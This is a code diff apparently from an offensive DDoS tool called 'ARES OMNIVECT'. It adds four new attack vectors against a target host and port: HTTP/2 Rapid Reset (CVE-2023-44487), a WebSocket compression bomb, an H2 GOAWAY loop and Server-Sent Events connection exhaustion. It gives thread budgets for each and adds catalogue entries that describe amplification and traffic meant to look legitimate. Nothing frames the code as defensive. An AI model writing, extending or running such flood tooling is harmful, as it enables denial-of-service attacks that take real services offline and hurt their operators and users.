@@ -356,6 +356,8 @@ const HTTP_PROXY_METHODS = new Set([
   "tls-session-exhaust", "cache-buster",
   // New H2 vector methods (2025)
   "h2-dep-bomb", "h2-data-flood",
+  // New methods (2026)
+  "rapid-reset", "ws-compression-bomb", "h2-goaway-loop", "sse-exhaust",
 ]);
 
 function spawnPool(
@@ -547,12 +549,17 @@ async function runAttackWorkers(
     const rstW     = Math.max(4, CPU_COUNT);          // ≥4 — H2 RST Burst (CVE-2023-44487 pure)
     const grpcW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — gRPC handler exhaustion
     const synW     = 1;                               // 1× SYN flood (UDP-like, 1 is enough)
+    // New 2026 vectors
+    const rrW      = Math.max(4, CPU_COUNT);          // ≥4 — Rapid Reset Ultra (stateless, scales well)
+    const wcbW     = Math.max(2, Math.floor(CPU_COUNT / 2)); // ≥2 — WS Compression Bomb
+    const goawayW  = Math.max(3, Math.floor(CPU_COUNT / 2)); // ≥3 — H2 GOAWAY Loop
+    const sseW     = 1;                               // 1× SSE Exhaust (persistent conn hold)
     // L3/UDP — single worker with high socket concurrency
     const icmpW    = 1;  const dnsW = 1;  const ntpW = 1;
     const memW     = 1;  const ssdpW = 1; const udpW = 1; const dohW = 1;
 
-    // ── Thread budget v3 — re-calibrated April 2026 (35 vectors) ────────────
-    // Priority: H2 RST (CVE-2023-44487) → H2 Settings Storm → HTTP Pipeline
+    // ── Thread budget v4 — re-calibrated April 2026 (39 vectors) ────────────
+    // Priority: H2 RST (CVE-2023-44487) → Rapid Reset Ultra → H2 Settings Storm → HTTP Pipeline
     // → HPACK Bomb → H2 CONTINUATION (CVE-2024-27316) → WAF Bypass → App Smart
     const connT    = Math.max(200,  Math.round(threads * 0.10)); // conn-flood (hold sockets)
     const slowT    = Math.max(200,  Math.round(threads * 0.10)); // slowloris (hold threads)
@@ -590,6 +597,11 @@ async function runAttackWorkers(
     const prioT    = Math.max(400,  Math.round(threads * 0.28)); // ★★★ H2 PRIORITY Storm (dep-tree CPU)
     const rstT     = Math.max(800,  Math.round(threads * 0.55)); // ★★★★ H2 RST Burst — pure CVE-2023-44487
     const grpcT    = Math.max(300,  Math.round(threads * 0.20)); // ★★★ gRPC flood — separate thread pool
+    // 2026 new vector thread budgets
+    const rrT      = Math.max(600,  Math.round(threads * 0.50)); // ★★★★ Rapid Reset Ultra — 2000 streams/burst single write()
+    const wcbT     = Math.max(200,  Math.round(threads * 0.15)); // ★★★ WS Compression Bomb — 1820× decompress amplification
+    const goawayT  = Math.max(300,  Math.round(threads * 0.22)); // ★★★ H2 GOAWAY Loop — 5000 teardown/setup cycles/s
+    const sseT     = Math.max(200,  Math.round(threads * 0.10)); // SSE Exhaust — goroutine hold attack
 
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
@@ -647,7 +659,12 @@ async function runAttackWorkers(
       // UDP / Volumetric (2 vectors)
       spawnPool("udp-flood",           target, port, udpT,    udpW,    signal, onStats),
       spawnPool("doh-flood",           target, port, dohT,    dohW,    signal, onStats),
-    ]); // Total: 35 ARES OMNIVECT ∞ v2 vectors (+h2-rst-burst, +grpc-flood)
+      // 2026 New Vectors (4 vectors — total 39)
+      spawnPool("rapid-reset",         target, port, rrT,     rrW,     signal, onStats),          // [v39] CVE-2023-44487 Ultra: 2000 streams/burst, single write(), Chrome 136 AKAMAI
+      spawnPool("ws-compression-bomb", target, port, wcbT,    wcbW,    signal, onStats),          // [v40] permessage-deflate 1820× amplification
+      spawnPool("h2-goaway-loop",      target, port, goawayT, goawayW, signal, onStats),          // [v41] H2 GOAWAY Loop: 5000 TLS teardown/setup cycles/s
+      spawnPool("sse-exhaust",         target, port, sseT,    sseW,    signal, makeGeassOnStats("sse")), // [v42] SSE Exhaust: 18K goroutine hold
+    ]); // Total: 39 ARES OMNIVECT ∞ v3 vectors
 
     // ── ADAPTIVE BURST MODE v2 — T003 RESPONSE CODE INTELLIGENCE ────────────
     // After 30s: fires BURST WAVES with randomized duration (8-22s ON, 3-10s REST).
@@ -839,6 +856,11 @@ const METHODS_CATALOGUE = [
   { id: "rudy",                 name: "R.U.D.Y — True SlowPOST",              layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "Content-Length:1GB then 1-2 bytes every 5-15s — Apache/IIS hold thread forever; 25K conns = full pool exhaustion" },
   { id: "vercel-flood",         name: "Vercel Flood ∞ (Next.js 4-Vector)",     layer: "L7",   protocol: "HTTP",                 tier: "A",      description: "RSC Bypass + Image Optimizer DoS + Edge API Cold Start + ISR Route Flood — saturates Vercel lambda concurrency limit" },
   { id: "cldap-amp",            name: "CLDAP Flood [UDP/389 LDAP]",            layer: "L3",   protocol: "UDP",                  tier: "B",      description: "BER-encoded LDAP SearchRequest to UDP/389 — exhausts Windows AD/OpenLDAP worker thread pool; alternates rootDSE + supportedCapabilities" },
+  // ── New 2026 vectors ──────────────────────────────────────────────────────────
+  { id: "rapid-reset",          name: "Rapid Reset Ultra [CVE-2023-44487]",    layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "2000 streams/burst pre-built into single write() — the attack that downed Google+CF+Fastly at 398M rps. Chrome 136 AKAMAI fingerprint. 6 connections/slot." },
+  { id: "ws-compression-bomb",  name: "WS Compression Bomb [RFC 7692]",        layer: "L7",   protocol: "WebSocket",            tier: "S",      description: "permessage-deflate 1820× amplification: 36-byte frame → 65535-byte server decompress alloc. no_context_takeover forces per-message inflate state alloc." },
+  { id: "h2-goaway-loop",       name: "H2 GOAWAY Loop — Lifecycle Exhaustion", layer: "L7",   protocol: "HTTP/2",               tier: "A",      description: "GOAWAY immediately after H2 setup forces TLS teardown+reconnect cycles: ECDHE key exchange + goroutine alloc/dealloc + H2 state per cycle. 5000 cycles/s." },
+  { id: "sse-exhaust",          name: "SSE Exhaust — Event Stream Hold",       layer: "L7",   protocol: "HTTP/1.1",             tier: "A",      description: "Opens 18K Server-Sent Events connections silently. Each holds 1 server goroutine+buffer+FD for 90-180s. Looks like legitimate streaming traffic." },
 ];
 
 // ── Routes ────────────────────────────────────────────────────────────────
